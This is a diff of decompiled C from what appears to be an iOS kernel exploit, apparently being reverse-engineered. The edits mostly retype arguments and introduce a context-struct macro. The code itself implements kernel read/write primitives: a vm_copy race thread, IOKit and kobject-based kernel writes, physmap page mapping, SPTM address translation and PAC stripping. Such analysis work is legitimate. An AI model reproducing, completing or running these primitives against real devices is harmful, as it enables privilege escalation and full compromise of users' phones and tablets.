@@ -163,8 +163,8 @@ __int64 __fastcall check_physmap_page_count(uint32_t *a1, __int64 a2);
 __int64 __fastcall map_sptm_state_page(__int64 a1);
 __int64 __fastcall get_physmap_region_ptrs(__int64, __int64, __int64, uint64_t *);
 __int64 __fastcall iokit_kwrite_via_port(struct_krwCtx *a1, __int64 a2, __int64 a3, int a4, __int64 a5, __int64 a6, unsigned __int64 a7);
-void __fastcall cfdict_set_int32(CFDictionaryRef *a1, const void *a2);
-__int64 __fastcall setup_vm_for_kwrite(__int64 a1, __int64 a2, unsigned __int64 a3);
+void __fastcall cfdict_set_int32(CFMutableDictionaryRef a1, const void *a2);
+__int64 __fastcall setup_vm_for_kwrite(struct_krwCtx *a1, __int64 a2, unsigned __int64 a3);
 __int64 __fastcall get_ipc_kobject_offset(struct_krwCtx *a1, __int64 a2, unsigned __int64 *a3);
 __int64 __fastcall read_ipc_port_table_entry(struct_krwCtx *a1, __int64 a2, unsigned int a3, unsigned __int64 *a4);
 __int64 __fastcall kwrite_u64_via_kobject(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
@@ -9015,7 +9015,7 @@ LABEL_363:
 LABEL_367:
               if ( (*(uint64_t *)(v5 + 392) & v172) == 0 )
               {
-                v173 = setup_vm_for_kwrite(v5, v4, v263);
+                v173 = setup_vm_for_kwrite(krwCtx, v4, v263);
                 if ( (uint32_t)v173 )
                 {
                   v10 = v173;
@@ -9928,7 +9928,7 @@ __int64 __fastcall iokit_kwrite_via_port(
 }
 
 //----- (00000000000101AC) ----------------------------------------------------
-void __fastcall cfdict_set_int32(CFDictionaryRef *a1, const void *a2)
+void __fastcall cfdict_set_int32(CFMutableDictionaryRef a1, const void *a2)
 {
   CFNumberRef v4; // x21
   int valuePtr; // [xsp+Ch] [xbp-24h] BYREF
@@ -9940,7 +9940,7 @@ void __fastcall cfdict_set_int32(CFDictionaryRef *a1, const void *a2)
 }
 
 //----- (0000000000010214) ----------------------------------------------------
-__int64 __fastcall setup_vm_for_kwrite(__int64 a1, __int64 a2, unsigned __int64 a3)
+__int64 __fastcall setup_vm_for_kwrite(struct_krwCtx *a1, __int64 a2, unsigned __int64 a3)
 {
   __int64 v5; // x19
   __int64 v6; // x22
@@ -9961,7 +9961,7 @@ __int64 __fastcall setup_vm_for_kwrite(__int64 a1, __int64 a2, unsigned __int64 
 
   v5 = 163855;
   if ( (unsigned int)krw_read_thunk(
-                       (struct_krwCtx *)a1,
+                       a1,
                        8LL * (unsigned int)((a3 - *(uint64_t *)(a2 + 13568)) >> vm_page_shift) + *(uint64_t *)(a2 + 13576),
                        8,
                        &v19) )
@@ -9969,41 +9969,41 @@ __int64 __fastcall setup_vm_for_kwrite(__int64 a1, __int64 a2, unsigned __int64 
     if ( (~(uint8_t)v19 & 3) != 0 )
       return 708628;
     v6 = v19 & 0xFFFFFFFFFFFCLL;
-    has_flag = krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A8);
+    has_flag = krw_ctx_has_flag(a1, KRW_CTX_FLAG_CPU_A8);
     v8 = 32;
     if ( !has_flag )
       v8 = 8;
-    if ( kread_physmap_decorated((struct_krwCtx *)a1, v6 + v8 - 0xFFFFFFFFFFE8LL, &v18) )
+    if ( kread_physmap_decorated(a1, v6 + v8 - 0xFFFFFFFFFFE8LL, &v18) )
     {
-      v9 = map_physpage_for_kobj((struct_krwCtx *)a1, v18 + ((a3 >> 10) & 0xC));
+      v9 = map_physpage_for_kobj(a1, v18 + ((a3 >> 10) & 0xC));
       if ( !v9 )
         return 163878;
       v10 = v9;
       address = 0;
       v11 = vm_page_size;
-      v12 = *(uint32_t *)(a1 + 88);
+      v12 = *(uint32_t *)&a1->gap4[84];
       if ( v12 + 1 > 1 )
       {
-        v14 = vm_map(mach_task_self_, &address, vm_page_size, 0, 1, v12, v9 & ~*(uint64_t *)(a1 + 392), 0, 3, 3, 2u);
+        v14 = vm_map(mach_task_self_, &address, vm_page_size, 0, 1, v12, v9 & ~a1->pageMask, 0, 3, 3, 2u);
         if ( v14 )
           return v14 | 0x80000000;
       }
-      else if ( (unsigned int)physmap_map_cached((struct_krwCtx *)a1, v9, (__int64)v20) )
+      else if ( (unsigned int)physmap_map_cached(a1, v9, (__int64)v20) )
       {
         return 0xFFFFFFFFLL;
       }
-      v15 = *(uint32_t *)(a1 + 88);
+      v15 = *(uint32_t *)&a1->gap4[84];
       if ( (unsigned int)(v15 + 1) >= 2 )
         v16 = address;
       else
         v16 = v20[0];
-      v17 = (*(uint64_t *)(a1 + 392) & v10) + v16;
+      v17 = (a1->pageMask & v10) + v16;
       if ( *(uint16_t *)v17 )
       {
         v5 = 0;
         atomic_fetch_add((atomic_ushort *volatile)v17, 0xFFFFu);
         *(uint16_t *)(v17 + 2) = 0x4000;
-        v15 = *(uint32_t *)(a1 + 88);
+        v15 = *(uint32_t *)&a1->gap4[84];
       }
       else
       {
@@ -10112,7 +10112,7 @@ __int64 __fastcall kwrite_u64_via_kobject(__int64 a1, __int64 a2, __int64 a3, __
 //----- (000000000001062C) ----------------------------------------------------
 __int64 __fastcall kread_via_kobject(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
 {
-  if ( (unsigned int)krw_read_thunk(*(struct_krwCtx **)(a1 + 32), a2, a4, (void *)a3) )
+  if ( (unsigned int)krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 32), a2, a4, (void *)a3) )
     return 0;
   else
     return 5;
@@ -10123,7 +10123,7 @@ __int64 __fastcall kread_u64_value(__int64 a1, __int64 a2)
 {
   __int64 v3; // [xsp+8h] [xbp-8h] BYREF
 
-  if ( (unsigned int)krw_read_thunk(*(struct_krwCtx **)(a1 + 32), a2, 8, &v3) )
+  if ( (unsigned int)krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 32), a2, 8, &v3) )
     return v3;
   else
     return 0;
@@ -10239,7 +10239,7 @@ unsigned __int64 __fastcall send_port_alloc_msg(__int64 a1, int a2)
   mach_msg_send(v5);
   v7 = krw_lookup_via_ctx_field32(*(uint64_t *)(a1 + 8), name) + 32;
   v8 = kread_u64_value(*(uint64_t *)(a1 + 8), v7);
-  v9 = *(struct_krwCtx **)(*(uint64_t *)(a1 + 8) + 32LL);
+  v9 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)(a1 + 8), 32);
   v10 = kread_u64_value(*(uint64_t *)(a1 + 8), v8 + 16);
   v11 = krw_xpac_vaddr_2(v9, v10);
   kwrite_u64_to_addr(*(uint64_t *)(a1 + 8), v7, 0);
@@ -10685,7 +10685,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
   v160 = 0;
   semaphore_create(mach_task_self_, &v160, 0, 0);
   v159 = 0;
-  v106 = kernel_va_base_resolver(*(struct_krwCtx **)(*v2 + 32), 0, &v159);
+  v106 = kernel_va_base_resolver(KRWCTX_FROM_RAW_FIELD(*v2, 32), 0, &v159);
   do
   {
     offset = 0;
@@ -10758,7 +10758,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
     *(uint32_t *)(a1 + 672) = 0;
     v23 = get_task_kobject_addr_from_field32(*(uint64_t *)(a1 + 8), v22);
     v24 = kread_u64_value(*(uint64_t *)(a1 + 8), qword_48008 + v23);
-    v25 = maybe_sptm_translate_kaddr(*(struct_krwCtx **)(*(uint64_t *)(a1 + 8) + 32LL), v24);
+    v25 = maybe_sptm_translate_kaddr(KRWCTX_FROM_RAW_FIELD(*(uint64_t *)(a1 + 8), 32), v24);
     if ( ((v25 + 272) & 0x3F) == 0x10 || (v25 & 0x3FFF) > 0x3EC0 )
       goto LABEL_68;
     v96 = v24;
@@ -10861,7 +10861,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
       if ( *v35 )
       {
         v44 = *(v35 - 1);
-        if ( maybe_sptm_translate_kaddr(*(struct_krwCtx **)(*v2 + 32), *v35) == v44 )
+        if ( maybe_sptm_translate_kaddr(KRWCTX_FROM_RAW_FIELD(*v2, 32), *v35) == v44 )
         {
           *v35 = v96;
           goto LABEL_47;
@@ -10913,7 +10913,7 @@ LABEL_68:
       v54 = 87;
       continue;
     }
-    v55 = *(struct_krwCtx **)(*v2 + 32);
+    v55 = KRWCTX_FROM_RAW_FIELD(*v2, 32);
     v56 = v55->xnuMajorVersion;
     v57 = krw_ctx_has_flag(v55, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK);
     if ( v56 >= 8796 )
@@ -10999,11 +10999,11 @@ LABEL_68:
     writePhysmapBlock.savedNext = v69;
     writePhysmapBlock.savedPrev = v68;
     v70 = get_task_kobject_addr_from_field32(*(uint64_t *)(a1 + 8), v162);
-    v71 = *(struct_krwCtx **)(*(uint64_t *)(a1 + 8) + 32LL);
+    v71 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)(a1 + 8), 32);
     v72 = kread_u64_value(*(uint64_t *)(a1 + 8), qword_48008 + v70);
     *(uint64_t *)(a1 + 360) = krw_xpac_vaddr_2(v71, v72);
     v73 = get_task_kobject_addr_from_field32(*(uint64_t *)(a1 + 8), child_act);
-    v74 = *(struct_krwCtx **)(*(uint64_t *)(a1 + 8) + 32LL);
+    v74 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)(a1 + 8), 32);
     v75 = kread_u64_value(*(uint64_t *)(a1 + 8), qword_48008 + v73);
     *(uint64_t *)(a1 + 376) = krw_xpac_vaddr_2(v74, v75);
     v76 = send_port_alloc_msg(a1, 0x10000);
